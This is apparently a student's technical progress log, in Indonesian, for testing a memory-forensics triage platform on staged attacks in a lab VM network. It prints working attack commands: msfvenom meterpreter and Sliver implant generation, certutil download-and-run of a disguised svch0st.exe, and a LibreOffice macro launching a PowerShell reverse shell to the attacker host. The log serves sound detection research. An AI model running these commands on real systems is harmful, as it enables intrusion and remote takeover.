# Progress Log — Pengujian Platform Triase Memori Forensik

> Catatan kronologis pengujian dataset. Di-update di tiap checkpoint (biasanya selesai satu dataset).
> Bukan narasi thesis — ini log teknis kerja. Narasi TA ditulis terpisah oleh Kevin.
>
> Rujukan desain lengkap: `dataset_design.md`. Rujukan grounding: memory `rule4-dataset-redesign`, `lfd-interview-q13-grounding`.

Lingkungan tetap:
- **Windows victim:** 192.168.70.130 — Win10 Pro 22H2 Build 19045.2965, user `forensic`, host `DESKTOP-UT8QQ8H`
- **Kali attacker:** 192.168.70.131 (VMware VM)
- **Akuisisi:** DumpIt (Administrator) → `.raw`
- **Analisis:** salin dump ke WSL `~/dumps/` → `run_dataset.py` (6 plugin Volatility3 2.28.1, tanpa timeout) → `core.analyzer.classify_all`
- **Snapshot dasar serangan:** `clean-base-attack` (Win10 bersih, Tamper+Real-time Defender OFF, folder `C:\Users\Public` di-exclude, IP .130). Di-restore ulang untuk tiap dataset serangan.

---

## Dataset 1 — `clean_baseline` — ✅ SELESAI

**Tujuan:** ukur spesifisitas / False Positive rate pada sistem bersih (noise sedang).
**Dump:** `clean_baseline.raw` (5 GB), jaringan NAT+internet.
**Noise:** Edge/Chrome, Word/Excel, VS Code, portable app di Downloads, Python (tanpa shell), proses Windows background.

**Hasil:**
| Metrik | Nilai |
|---|---|
| Total proses | 179 PID |
| CLEAN | 178 |
| SUSPICIOUS | 1 |
| Spesifisitas | 99.4% |

**1 False Positive (terdokumentasi, TIDAK di-whitelist):**
- `PaintStudio.Vi` (Paint 3D), PID 12152 — Rule 2, koneksi telemetry sah MS/Azure ke `48.209.133.15:443`, tidak ada di `LEGIT_NETWORK_PROCESSES`.
- **Keputusan:** biarkan & dokumentasikan (sensitivitas > spesifisitas). Membuktikan platform jujur melaporkan FP.

**Verifikasi rule lain (semua benar):**
- Rule 3 tersuppress benar: 14 malfind RWX semuanya `MsMpEng.exe` (Defender) → ada di `LEGIT_RWX_PROCESSES`.
- Rule 4b benar: 14 handle ke lsass semuanya dipegang `System` (PID 4) → whitelisted.
- **TODO VERIFIKASI RESOLVED:** field Volatility3 dikonfirmasi — `dlllist` punya Path/Name/Process; `handles` punya Type/Name (fmt "lsass.exe Pid N")/GrantedAccess (int desimal). Komentar analyzer.py sudah di-update.

---

## Dataset 2 — `infected_r1a_masquerade` — ✅ SELESAI

**Target:** Rule 1a (typosquatting + suspicious path)
**MITRE:** T1036.005 (Masquerading: Match Legitimate Name or Location)
**Q13:** poin 1 (nama proses menyerupai proses sah)
**Prevalensi:** Picus Red Report 2026 — T1036 Masquerading #6 global.

**Prosedur (SELESAI dieksekusi):**
1. Restore snapshot `clean-base-attack`, Defender OFF.
2. Kali: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.70.131 LPORT=4444 -f exe -o svch0st.exe` → payload 7168 bytes.
3. Kali: handler `use exploit/multi/handler` (payload sama, LHOST .131, LPORT 4444) → `Started reverse TCP handler`.
4. Kali #2: `python3 -m http.server 8000`.
5. Windows: `certutil -urlcache -split -f http://192.168.70.131:8000/svch0st.exe C:\Users\Public\svch0st.exe`.
6. Windows: jalankan `C:\Users\Public\svch0st.exe` → **Meterpreter session 1 opened**.
7. Windows: DumpIt selagi C2 aktif → `infected_r1a_masquerade.raw` (5 GB).

**Ground Truth (dikonfirmasi via meterpreter):**
- Proses jahat: **`svch0st.exe`**
- **PID: 4988**
- User: `DESKTOP-UT8QQ8H\forensic`
- C2: 192.168.70.130 → 192.168.70.131:4444, ESTABLISHED saat capture.

**Expected Output:**
- PID 4988 `svch0st.exe` = SUSPICIOUS
- **Rule1_hit = True (PRIMER):** typosquatting (edit distance 1 dari `svchost.exe`) + path `\users\public\`.
- Kemungkinan sekunder: Rule2 (C2 ke .131:4444), Rule3 (shellcode meterpreter RWX).

**Hasil analyzer:**
| Metrik | Nilai |
|---|---|
| Total proses | 160 PID |
| CLEAN | 159 |
| SUSPICIOUS | 1 (PID 4988 `svch0st.exe`) |
| False Positive | 0 |

Deteksi PID 4988 `svch0st.exe` — **R1=R2=R3=R4=True** (empat rule menyala):
- `[Rule1]` Typosquatting: `svch0st.exe` mirip `svchost.exe` (edit distance=1) — **PRIMER**
- `[Rule1]` Path mencurigakan: `C:\Users\Public\svch0st.exe` mengandung `\users\public\`
- `[Rule2]` Koneksi outbound abnormal: `svch0st.exe` → 192.168.70.131:4444 (TCPv4, ESTABLISHED)
- `[Rule3]` Code injection: RWX (PAGE_EXECUTE_READWRITE) + PrivateMemory @ 1769472
- `[Rule4]` DLL path mencurigakan: memuat dari `\users\public\`

**Verifikasi:**
- ✅ Ground truth cocok persis: PID 4988 (dari meterpreter `getpid`) = PID yang ditandai analyzer.
- ✅ Target primer R1a terpenuhi (typosquatting + path).
- ✅ Zero FP di 159 proses lain.
- ✅ Deteksi berlapis (R2/R3/R4) muncul ORGANIK dari payload meterpreter asli → bukti anti-circular-reasoning: indikator tidak ditanam.

**⚠️ Temuan penting (untuk desain Dataset 6):**
Rule 4 menyala karena `dlllist` menyertakan **modul EXE utama** proses (`svch0st.exe` memuat dirinya sendiri dari path mencurigakan). BUKAN false positive (path memang mencurigakan), tapi konsekuensinya: **proses apa pun dari path mencurigakan otomatis kena R1-path + R4a** (sinyal redundan). → Dataset 6 (`infected_r4a_dll`) HARUS pakai **DLL sideload terpisah** dari path mencurigakan, JANGAN andalkan EXE utama, supaya R4a diuji independen. (Di clean_baseline hal ini tak muncul karena semua proses sah jalan dari path sah → EXE-nya tak kena keyword.)

---

## Dataset 3 — `infected_r1b_parentchild` — ✅ SELESAI

**Target:** Rule 1b (parent-child spawn abnormal)
**MITRE:** T1059.001 (PowerShell)
**Q13:** poin 6 (aplikasi dokumen meluncurkan cmd/PowerShell)
**Prevalensi:** Picus Red Report 2026 — T1059 #2 global.

**Prosedur (SELESAI dieksekusi):**
1. Victim tak punya MS Office → pakai **LibreOffice** (`soffice.bin` ∈ `SUSPICIOUS_CHILD_SPAWNERS`).
2. Kali: `p.ps1` = plain PowerShell TCP reverse shell ke `192.168.70.131:4444` (meterpreter `psh-reflection` gagal connect → diganti reverse shell murni, lebih andal + menjaga powershell tetap hidup di loop).
3. Kali: `python3 -m http.server 8000` + listener `nc -lvnp 4444`.
4. Victim: simpan `p.ps1` ke `C:\Users\Public\p.ps1` (via DownloadFile).
5. Macro LibreOffice Basic (COM automation): `CreateObject("WScript.Shell").Run("powershell -nop -ep bypass -File C:\Users\Public\p.ps1", 1, False)` → F5.
6. Reverse shell connect ke nc → rantai `soffice.bin → powershell.exe` (langsung) hidup.
7. `Stop-Process` proses PowerShell manual liar (PID 4740) → DumpIt selagi C2 aktif → `infected_r1b_parentchild.raw` (5 GB).

**⚠️ Catatan teknis (kenapa WScript.Shell, bukan `Shell()`):** `Shell()` LibreOffice bisa spawn proses tanpa argumen (notepad OK) & lewat `cmd /c` (OK), tapi **gagal meluncurkan `powershell.exe` langsung dengan argumen** — dibuktikan lewat tes terkontrol (p.ps1 sudah di disk, tetap tak ada proses/koneksi = bukan soal file, tapi `Shell()`-nya). `CreateObject("WScript.Shell")` di-load in-process ke `soffice.bin` → `.Run` men-spawn powershell sebagai anak LANGSUNG soffice.bin (T1059.001 murni). Metode `cmd /c` sebelumnya juga valid (`soffice.bin → cmd.exe → powershell.exe`, R1b via soffice→cmd) tapi versi langsung dipilih final. Sinyal sukses reverse shell = koneksi masuk di nc, BUKAN GET (p.ps1 lokal).

**Ground Truth (dikonfirmasi via `Get-CimInstance Win32_Process`):**
- `soffice.bin` **PID 9140** (PPID 11232) — spawner
- `powershell.exe` **PID 10120** (PPID 9140) — anak LANGSUNG soffice.bin, pemegang C2

**Hasil analyzer (2 Juli 2026):**
| Metrik | Nilai |
|---|---|
| Plugin | pslist 168, pstree 8, netscan 107, malfind 245, dlllist 8353, handles 65137 |
| Total proses | 169 PID |
| CLEAN | 167 |
| SUSPICIOUS | 2 |
| False Positive | 0 |

- **PID 9140 `soffice.bin` — R1=True (PRIMER):** `[Rule1] Spawn mencurigakan: 'soffice.bin' (PID=9140) -> 'powershell.exe' (PID=10120)`
- **PID 10120 `powershell.exe` — R2=True R3=True (sekunder organik):** C2 ke `192.168.70.131:4444` ESTABLISHED + RWX+PrivateMemory (5 segmen .NET/shellcode).

**Verifikasi:**
- ✅ Target primer R1b terpenuhi; PID 9140 + anak LANGSUNG powershell.exe 10120 cocok persis ground truth.
- ✅ Zero FP di 167 proses lain; hanya 2 SUSPICIOUS, keduanya bagian rantai yang ditanam.
- ✅ powershell liar 4740 di-Stop-Process → dataset bersih dari sisa troubleshooting.
- ✅ Deteksi berlapis (R2/R3) organik dari reverse shell nyata — anti-circular-reasoning.

**Lokasi dump:** `D:\forensic_triase\dataset_update\infected_r1b_parentchild.raw`

---

## Dataset 4 — `infected_r2_network` — ✅ SELESAI

**Target:** Rule 2 (network artifacts) — **terisolasi murni** (R1/R3/R4 sengaja tak menyala)
**MITRE:** T1071.001 (Application Layer Protocol)
**Q13:** poin 4 (koneksi outbound ke host lain, port tak umum)
**Prevalensi:** Picus Red Report 2026 — T1071 #5 global.

**Nilai untuk sidang:** membuktikan **deteksi mandiri R2** — implant C2 nyata kelas
profesional (Sliver) yang bernama benign, jalan dari path sah, tanpa injeksi kode →
**LOLOS Rule 1, 3, dan 4**, tertangkap **HANYA oleh Rule 2** lewat koneksi C2-nya.

**Tool:** **Sliver** (Bishop Fox), bukan meterpreter. Alasan: meterpreter reflective
DLL selalu meninggalkan RWX → R3 ikut menyala (Dataset 2 & 3). Implant Go Sliver
memuat kode dari section `.text` (RX, bukan RWX) → R3 tidak menyala → R2 bisa diuji
terisolasi.

**Prosedur (SELESAI dieksekusi):**
1. Kali: install Sliver via `apt` (repo `http.kali.org` diblok redirect ke mirror
   kampus `172.16.0.9:8183` yang mati → ganti mirror ke `kali.download` CDN → `apt
   install -y sliver`).
2. Kali (host-only, IP statis `.131` via nmcli — VMnet host-only tanpa DHCP):
   `sliver-server` → `mtls --lport 8443` → `generate --mtls 192.168.70.131:8443 --os
   windows --arch amd64 --format exe --save /tmp/atlas.exe` (34 MB).
3. Victim (host-only, IP statis `.130` via `netsh` — juga APIPA karena tak ada DHCP):
   `mkdir "C:\Program Files\AtlasSync"` → `certutil` unduh implant jadi
   `AtlasAgent.exe` (perlu `chmod 644 /tmp/atlas.exe` dulu; Sliver simpan file 700
   root → http.server user tak bisa baca → 404).
4. Victim: **double-click** `AtlasAgent.exe` di Explorer (parent = explorer.exe).
5. Sliver `sessions` → session windows/amd64 dari `.130` muncul. **Tanpa post-ex.**
6. Victim: `netstat -ano | findstr 8443` → ESTABLISHED, PID 8732 → DumpIt selagi
   C2 aktif → `infected_r2_network.raw` (5 GB).

**⚠️ Catatan jaringan (untuk Dataset 5–7):** VMnet host-only **tidak punya DHCP**.
Tiap restore snapshot lama, victim dapat APIPA (169.254.x.x) → **harus set IP statis
`.130` manual** (`netsh interface ip set address name="Ethernet0" static 192.168.70.130
255.255.255.0`). Kali `.131` sudah statis permanen via nmcli. Saran efisiensi: buat
snapshot baru `clean-base-attack-hostonly` yang sudah memuat IP statis victim.

**Ground Truth (dikonfirmasi via `netstat -ano` + `tasklist` saat capture):**
- `AtlasAgent.exe` **PID 8732** (PPID 6052 = `explorer.exe`) — implant C2
- C2: `192.168.70.130:61575 → 192.168.70.131:8443` (TCPv4, ESTABLISHED)

**Hasil analyzer (3 Juli 2026):**
| Metrik | Nilai |
|---|---|
| Plugin | pslist 154, pstree 7, netscan 114, malfind 7, dlllist 7247, handles 54765 |
| Total proses | 154 PID |
| CLEAN | 153 |
| SUSPICIOUS | 1 |
| False Positive | 0 |

- **PID 8732 `AtlasAgent.exe` — R2=True (PRIMER), R1=R3=R4=False:** `[Rule2] Koneksi outbound abnormal: 'AtlasAgent.exe' -> 192.168.70.131:8443 (TCPv4, ESTABLISHED)`

**Verifikasi:**
- ✅ Target primer R2 terpenuhi; PID 8732 + ForeignAddr:Port cocok persis ground truth.
- ✅ **Isolasi R2 sempurna (R1=R3=R4=False)** — gate R3 lolos tanpa fallback ncat.
  `AtlasAgent.exe` tak muncul di malfind sama sekali (Sliver Go zero RWX).
- ✅ malfind 7 record semuanya whitelist (`MsMpEng.exe` ×6, `smartscreen.ex` ×1)
  ∈ `LEGIT_RWX_PROCESSES` → R3 tersupresi benar.
- ✅ Zero FP di 153 proses lain — host-only tanpa internet membuktikan: koneksi
  ESTABLISHED eksternal satu-satunya adalah C2 (tak ada telemetri seperti Paint3D D1).

**Lokasi dump:** `D:\forensic_triase\dataset_update\infected_r2_network.raw` |
hasil: `results/r2_network/`

---

## Dataset 5–7 — ⏳ BELUM
| # | Dataset | Rule | MITRE | Q13 |
|---|---|---|---|---|
| 5 | infected_r3_injection | R3 | T1055.001 | (injeksi) |
| 6 | infected_r4a_dll | R4a | T1574.001/002 | poin 3 |
| 7 | infected_r4b_lsass | R4b | T1003.001 | poin 5 |

## Kategori B — ⏳ BELUM
- +1 dataset malware asli (MalwareBazaar/theZoo) di VM host-only isolated — ecological validity.

## Regresi & Metrik — ⏳ BELUM
- Jalankan ulang semua dataset, hitung Sensitivity/Specificity/Precision, tabel confusion.
